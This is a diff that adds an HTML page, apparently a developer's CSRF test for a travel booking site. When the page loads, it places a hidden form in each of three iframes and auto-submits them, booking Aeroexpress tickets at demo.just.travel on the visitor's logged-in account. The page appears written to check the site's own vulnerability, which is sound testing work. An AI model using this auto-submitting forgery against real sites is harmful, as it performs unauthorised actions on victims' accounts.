@@ -1,0 +1,42 @@
+<html>
+<head>
+<title>Тест атаки CSRF</title>
+<script type="text/javascript" src="jquery.js"></script>
+
+<script>
+	$(function(){
+		var template = $("#template").html();
+		for(var i=0; i< 3; i++){
+			var frame = $('<iframe width="800" height="300"/>').appendTo('body').contents().find('body').append(template);
+			var formInFrame = frame.find("form");
+			formInFrame.submit();
+		}
+	});
+</script>
+
+</head>
+<body>
+
+<h1>Сейчас мы попробуем забронировать через левый сайт 3 билета АЭ на ваш аккаунт</h1>
+<h3>Если в результирующих трех окнах написано, что бронь удалась, то увы, сайт подвержен атаке CSRF</h3>
+
+<div id="template">
+	<form action="https://demo.just.travel/aeroexpress/book" method="POST">
+		<input type="hidden" name="groups[0].airportId" value='6280'>
+		<input type="hidden" name="groups[0].direction" value='FROM'>
+		<input type="hidden" name="groups[0].serviceClass" value='COMMON'>
+		<input type="hidden" name="groups[0].passengerCount" value='1'>
+		<input type="hidden" name="groups[0].tariff" value='FULL'>
+		<input type="hidden" name="groups[0].time" value=''>
+		<input type="hidden" name="groups[0].seats" value=''>
+		<input type="hidden" name="groups[0].date" value='16.01.2014'>
+		<input type="hidden" name="email" value='ddd@dd.dd'>
+		<input type="hidden" name="phone" value='81-11-1111-1111'>
+		<input type="hidden" name="paymentProvider" value=''>
+		<input type="hidden" name="_just_next" value=''>
+	</form>
+<div>
+
+
+</body>
+</html>
